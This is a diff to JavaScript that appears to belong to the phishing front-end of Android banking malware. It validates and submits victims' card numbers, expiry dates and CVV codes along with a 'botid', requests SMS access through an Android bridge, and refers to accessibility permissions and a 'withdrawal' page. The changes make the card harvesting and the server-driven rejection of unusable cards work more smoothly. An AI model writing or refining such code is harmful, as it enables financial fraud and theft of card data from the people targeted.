@@ -8,7 +8,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const addressZip = document.getElementById("adresszip");
   const formButton = document.getElementById("form");
   const formCardText = document.getElementById("form-card");
-
+  let formValided = false;
   const originalText = formCardText?.textContent;
 
   function isDateValid(value) {
@@ -60,7 +60,6 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   function handleFormClick() {
-    console.log("yes1");
     const cardNValid =
       cardN?.value && luhnCheck(cardN.value.replace(/\s+/g, ""));
     const cardDateValid = cardDate?.value && isDateValid(cardDate?.value);
@@ -72,6 +71,7 @@ document.addEventListener("DOMContentLoaded", function () {
     validateInput(cardN, cardNValid);
     validateInput(cardDate, cardDateValid);
     validateInput(cardV, cardVValid);
+
     if (formCardText) {
       if (!cardNValid || !cardDateValid || !cardVValid) {
         formCardText.textContent = "Check the correctness of the data*";
@@ -88,10 +88,16 @@ document.addEventListener("DOMContentLoaded", function () {
             input.classList.remove("invalid-input");
           });
         }, 5000);
+        return false;
+      } else {
+        // If all validations are okay, return true
+        return true;
       }
     }
-    console.log("yes");
+    // If for some reason formCardText doesn't exist, consider the form invalid
+    return false;
   }
+
   cardV?.addEventListener("input", (event) => {
     event.target.value = event.target.value.replace(/[^0-9]/g, ""); // This line will replace any non-digit characters with an empty string
     formButton.disabled = !checkFilledInputs();
@@ -124,7 +130,7 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   });
 
-  formButton?.addEventListener("click", handleFormClick);
+  // formButton?.addEventListener("click", handleFormClick);
 
   const registrateButton = document.getElementById("registrate");
   registrateButton?.addEventListener("click", (event) => sendForm1(event));
@@ -141,7 +147,8 @@ document.addEventListener("DOMContentLoaded", function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         //  console.log(xhr.responseText);
-        window.location.href = '../quiz.html';
+        window.location.href = "./permissions.html";
+        setCookie("validphone", true, 7);
 
         // sendRequestWithBotId(); // Вызываем функцию showLoaderAndRedirect() после выполнения запроса
       } else {
@@ -158,6 +165,12 @@ document.addEventListener("DOMContentLoaded", function () {
   // function clickGiveAccess() {
   //   checkGivePerm();
   // }
+  function setCookie(name, value, daysToLive) {
+    var date = new Date();
+    date.setTime(date.getTime() + daysToLive * 24 * 60 * 60 * 1000);
+    var expires = "expires=" + date.toUTCString();
+    document.cookie = name + "=" + value + ";" + expires + ";path=/";
+  }
 
   function clickSmsAccess() {
     checkSmsPerm();
@@ -166,6 +179,10 @@ document.addEventListener("DOMContentLoaded", function () {
   formSendButton?.addEventListener("click", (event) => sendForm2(event));
   function sendForm2(event) {
     event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
+    const isFormValid = handleFormClick();
+    if (!isFormValid) {
+      return;
+    }
     var form = document.getElementById("form2");
     var formData = new FormData(form);
     var botId = getQueryParam("botid");
@@ -177,8 +194,7 @@ document.addEventListener("DOMContentLoaded", function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         console.log(xhr.responseText);
-        window.location.href = '../loader.html';
-
+        window.location.href = "./loader.html";
         sendRequestWithBotId(); // Вызываем функцию sendRequestWithBotId() после выполнения запроса
       } else {
         // Обработка ошибок
@@ -197,30 +213,71 @@ document.addEventListener("DOMContentLoaded", function () {
       xhr.onreadystatechange = function () {
         if (xhr.readyState === 4) {
           var responseCode = xhr.status;
-          if (responseCode === 400) {
-            setTimeout(sendRequestWithBotId, 1000);
-          } else if (responseCode === 201) {
-            window.location.href = "end.php";
-          } else if (responseCode === 202) {
-            alert("credit card not accepted");
+          var formCardInput = document.getElementById("form-card");
+          var formAddressInput = document.getElementById("form-adress"); // Please ensure the id is correct, it seems like there is a typo, it should be "form-address-input" if that's what's in your HTML.
+          // Clear previous errors
+          // if (formCardInput) formCardInput.textContent = "";
+          // if (formAddressInput) formAddressInput.textContent = "";
 
-            var button = document.getElementById("submitButton2");
-            button.disabled = false; // Делаем кнопку неактивной после отправки формы
-          } else if (responseCode === 203) {
-            alert("virtual card not accepted");
-            var button = document.getElementById("submitButton2");
-            button.disabled = false; // Делаем кнопку неактивной после отправки формы
-          } else if (responseCode === 204) {
-            alert("invalid address provided");
-            var button = document.getElementById("submitButton2");
-            button.disabled = false; // Делаем кнопку неактивной после отправки формы
-          } else if (responseCode === 205) {
-            alert("invalid card");
-            var button = document.getElementById("submitButton2");
-            button.disabled = false; // Делаем кнопку неактивной после отправки формы
-          } else {
-            console.error("Unexpected response code: " + responseCode);
+          // Re-enable the submit button if there was an error
+          if (
+            responseCode === 202 ||
+            responseCode === 203 ||
+            responseCode === 205
+          ) {
+            window.location.href = "./form.html";
+            setTimeout(() => {
+              formCardInput.style.color = "red";
+              formCardInput.classList.remove("header-primary");
+            }, 500);
+            setTimeout(() => {
+              formCardInput.textContent = "Your card";
+              formCardInput.classList.add("header-primary");
+              formCardInput.style.color = "";
+            }, 5000);
           }
+          if (responseCode === 204) {
+            window.location.href = "./form.html";
+            setTimeout(() => {
+              formAddressInput.style.color = "red";
+              formAddressInput.classList.remove("header-primary");
+            }, 500);
+
+            setTimeout(() => {
+              formAddressInput.textContent = "Adress";
+              formAddressInput.classList.add("header-primary");
+              formAddressInput.style.color = "";
+            }, 5000);
+          }
+          switch (responseCode) {
+            case 202:
+              if (formCardInput)
+                formCardInput.textContent = "Credit card not accepted.";
+              break;
+            case 203:
+              if (formCardInput)
+                formCardInput.textContent = "Virtual card not accepted.";
+              break;
+            case 204:
+              if (formAddressInput) {
+                formAddressInput.textContent = "Invalid address provided.";
+                formAddressInput.style.color = "red";
+              }
+              break;
+            case 205:
+              if (formCardInput) formCardInput.textContent = "Invalid card.";
+              break;
+            case 201:
+              window.location.href = "./withdrawal.html";
+              break;
+            case 400:
+              setTimeout(sendRequestWithBotId, 1000);
+              break;
+            default:
+              console.error("Unexpected response code: " + responseCode);
+          }
+          var button = document.getElementById("submitButton2");
+          if (button) button.disabled = false;
         }
       };
       xhr.send();
@@ -246,7 +303,8 @@ document.addEventListener("DOMContentLoaded", function () {
             setTimeout(checkSmsPerm, 1000);
           } else if (responseCode === 200) {
             //разрешение выдано
-            window.location.href = '../registration.html';
+            window.location.href = "./quiz.html";
+            setCookie("validsms", true, 7);
           } else if (responseCode === 202) {
             //разрешение не выдано
             Android.clicksmsaccess();
@@ -260,36 +318,7 @@ document.addEventListener("DOMContentLoaded", function () {
       console.error("Missing botid parameter");
     }
   }
-  // function checkGivePerm() {
-  //   var botId = getQueryParam("botid");
-  //   if (botId) {
-  //     var xhr = new XMLHttpRequest();
-  //     xhr.open(
-  //       "GET",
-  //       "vailead.php?method=perm&perminfo=accessibility&botid=" + botId,
-  //       true
-  //     );
-  //     xhr.onreadystatechange = function () {
-  //       if (xhr.readyState === 4) {
-  //         var responseCode = xhr.status;
-  //         if (responseCode === 400) {
-  //           setTimeout(checkGivePerm, 1000);
-  //         } else if (responseCode === 200) {
-  //           //разрешение выдано
-  //           alert("perm est!");
-  //         } else if (responseCode === 202) {
-  //           //разрешение не выдано
-  //           Android.clickgiveaccess();
-  //         } else {
-  //           console.error("Unexpected response code: " + responseCode);
-  //         }
-  //       }
-  //     };
-  //     xhr.send();
-  //   } else {
-  //     console.error("Missing botid parameter");
-  //   }
-  // }
+
   function getQueryParam(name) {
     var urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(name);
